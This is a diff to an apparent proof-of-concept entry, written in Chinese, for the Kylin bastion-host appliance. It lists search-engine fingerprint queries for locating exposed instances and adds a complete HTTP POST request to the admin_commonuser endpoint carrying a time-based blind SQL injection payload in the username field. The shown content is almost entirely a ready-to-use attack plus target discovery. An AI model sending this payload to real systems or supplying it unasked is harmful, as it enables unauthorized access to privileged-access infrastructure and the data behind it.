@@ -33,3 +33,16 @@ poc:
 检索条件：
 cert="Baolei" 或 title="麒麟堡垒机" 或 body="admin.php?controller=admin_index&action=get_user_login_fristauth" 或 body="admin.php?controller=admin_index&action=login"
 
+## 请求包
+```
+POST /admin.php?controller=admin_commonuser HTTP/1.1
+Host: ip:port
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
+Connection: close
+Content-Length: 78
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+username=admin' AND (SELECT 6999 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm
+```
